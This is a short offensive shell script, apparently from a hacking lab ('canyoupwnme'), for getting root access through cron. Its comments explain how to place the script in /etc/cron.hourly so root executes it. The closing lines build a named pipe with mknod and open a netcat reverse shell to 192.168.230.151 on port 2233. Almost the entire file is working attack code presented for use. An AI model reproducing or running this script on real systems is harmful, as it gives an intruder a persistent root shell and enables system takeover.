#!/bin/sh
# privilege escalation script with netcat and cron.hourly
#  make sure chmod 777 ./privesc
#  ls -lah to check permissions
#  cp -f ./privesc /etc/cron.hourly/privesc
# check the time with the "date" command and wait
# for the script to be run at the specific time
##  admin@canyoupwnme:/tmp$ cat /etc/crontab | grep -i hour
#    Add this to crontab      *	* * *	root    
## cd / && run-parts --report /etc/cron.hourly
###
# mknod info here http://man7.org/linux/man-pages/man2/mknod.2.html
# The system call mknod() creates a filesystem node (file, device
# special file, or named pipe) named pathname, with attributes
# specified by mode and dev

mknod /tmp/backpipe p
/bin/sh 0</tmp/backpipe|nc 192.168.230.151 2233 1>/tmp/backpipe &
